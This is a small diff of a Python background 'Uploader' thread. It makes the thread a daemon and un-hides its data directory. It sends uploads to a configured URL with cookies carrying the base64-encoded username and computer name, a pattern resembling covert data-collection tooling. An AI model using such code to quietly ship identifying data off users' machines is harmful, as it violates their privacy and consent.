@@ -29,10 +29,10 @@ class Uploader(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.name = __name__
-        self.daemon = False
+        self.daemon = True
         self.active = False
 
-        self.datadir = os.path.join(utils.getDataDIR(), fmt('.{NAME}', **config))
+        self.datadir = os.path.join(utils.getDataDIR(), fmt('{NAME}', **config))
         self.url = fmt('{URL}/upload', **config)
         self.cookie = {"username": base64.urlsafe_b64encode(utils.utf(utils.getUserName())),
                        'compname': base64.urlsafe_b64encode(utils.utf(utils.getCompName()))}
